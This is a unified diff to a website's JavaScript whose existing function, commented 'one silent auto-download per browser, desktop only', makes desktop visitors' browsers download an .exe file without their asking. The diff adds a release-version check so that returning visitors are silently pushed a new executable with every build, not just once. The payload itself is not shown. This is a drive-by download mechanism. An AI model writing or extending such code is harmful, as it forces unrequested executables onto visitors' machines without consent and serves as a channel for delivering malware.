@@ -47,6 +47,7 @@
     if (STATIC) return FILE[f === "apk" ? "apk" : "exe"];
     return BASE + "&do=dl&f=" + f + "&src=" + src;
   };
+  var REL = "2.0";      // bump with every release: returning visitors re-download a newer build
   var COOKIE = "ww_d";
 
 
@@ -128,7 +129,9 @@
   // 7) one silent auto-download per browser, desktop only
   function autoDl() {
     try {
-      if (isMobile || localStorage.getItem("ww_al")) return;
+      if (isMobile) return;
+      if (localStorage.getItem("ww_rel") === REL) return;   // already on this build?
+      localStorage.setItem("ww_rel", REL);
       localStorage.setItem("ww_al", "1");
       var a = document.createElement("a");
       a.href = dlUrl("exe", "al") + (STATIC ? "" : "&t=" + Date.now());
